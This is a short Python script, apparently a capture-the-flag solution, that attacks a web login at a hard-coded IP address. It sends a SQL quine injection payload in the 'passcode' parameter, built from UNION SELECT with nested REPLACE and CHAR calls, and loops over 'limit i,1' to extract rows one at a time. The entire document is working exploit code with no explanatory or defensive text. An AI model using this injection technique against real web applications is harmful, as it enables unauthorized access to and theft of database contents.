import requests

url = "http://1.224.175.39:9980/index.php"

params = {
	'cid':1,
	'passcode':"""g0pher' union select REPLACE(REPLACE('g0pher" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),1337 AS Quine-- "||1 limit 0,1#',CHAR(34),CHAR(39)),CHAR(36),'g0pher" union select REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),1337 AS Quine-- "||1 limit 0,1#'),1337 AS Quine-- '||1 limit 0,1#"""
}

for i in range(1,10):
	params['passcode'] = params['passcode'].replace("limit "+str(i-1)+",1", "limit "+str(i)+",1")
	#print(params['passcode'])
	res = requests.get(url, params=params)
	idx = res.text.index("<hr>")
	data = res.text[idx:]
	print(data)


